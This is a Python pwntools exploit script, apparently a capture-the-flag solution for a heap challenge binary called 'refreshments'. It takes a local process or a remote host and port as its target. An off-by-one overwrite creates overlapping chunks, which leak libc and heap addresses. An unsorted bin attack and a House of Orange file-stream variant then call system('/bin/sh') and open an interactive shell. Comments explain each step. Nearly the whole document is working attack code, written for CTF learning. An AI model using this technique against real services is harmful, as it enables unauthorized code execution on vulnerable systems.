#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./refreshments")
    if args.GDB:
        gdb.attach(r,'b *_IO_flush_all_lockp+256\n')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def add():
    sla(">> ", "1")
def remove(idx):
    sla(">> ", "2")
    sla(": ", str(idx))
def edit(idx, data):
    sla(">> ", "3")
    sla(": ", str(idx))
    sa(": ", data)
def show(idx):
    sla(">> ", "4")
    sla(": ", str(idx))

add() #0
add() #1
add() #2
add() #3
add() #4
add() #5 (not needed XD)
'''
How to leak: (The chunk id are different from the exploit)
First we have the following heap layout:
Chunk 0
Chunk 1 (Chunk 0 off by one so size is 0xc1)
Chunk 2

1. Free Chunk 1
Chunk 0
Unsorted bin 0xc1 (Overlap with Chunk 2)
Chunk 2

2. Allocate chunk 3
Chunk 0
Chunk 3
Chunk 2 / Unsorted bin 0x61 (This chunk is both chunk 2 and freed unsorted bin, which contains libc address)

3. Print Chunk 2 -> Libc Leak

Heap leak is similar, create overlap chunk and put that chunk into fastbin
'''
edit(0,b'A'*0x58+b'\xc1')
remove(1)
add() #6
show(2)
ru("Glass content: ")
libc = u64(r.recv(8)) - 0x399b78
IO_list_all = libc + 0x39a520
system = libc + 0x3f830
add() # 7
remove(0)
remove(7)
show(2)
ru("Glass content: ")
heap = u64(r.recv(8))
'''
We can do unsorted bin attack here, then we can use house of orange to get shell.
Notice that in normal house of orange is to do unsorted bin attack on 0x60 chunk
Then it'll overwrite IO_list_all to main_arena+88, and if you treat main_arena+88 as a FILE structure
The _chain (next pointer) will point to the 0x60 small bin, so we also need to control a 0x60 small bin
However due to my testing I cannot get a 0x60 small bin in this challenge (Or maybe we can? I haven't digged into it)
But I found another thing is that if we do an unsorted bin attack on size 0xc0,
when it tries to abort and FSOP there's actually a 0xc0 small bin, thus we can create a controlled size small bin
After using gdb I found that (main_arena+88)->chain->chain is pointing to small bin 0xb0
(Which is the third FILE structure of FSOP chain, the original house of orange is controlling the second FILE structure)
And that's it, the rest is the same as original house of orange.
'''
add() # 8
edit(6,b'D'*0x50+b'/bin/sh\x00'+b'\xb1')
edit(3, b'\x00'*0x48+p64(0x71))
remove(8)
payload = b'B'*8+p64(IO_list_all-0x10)+p64(0)+p64(1)
edit(2,payload.ljust(0x58,b'\x00')) 
edit(4,p64(0)+p64(heap+0x1a0)+p64(0)*3+p64(system))
add() # 9
add() # 10
leak("libc",hex(libc))
leak("heap",hex(heap))
r.interactive()

'''
p *_IO_list_all
p *(_IO_list_all.file->_chain)
p *((struct _IO_FILE_plus *)0x6385859180c0)
Reference:
https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html?m=1
'''
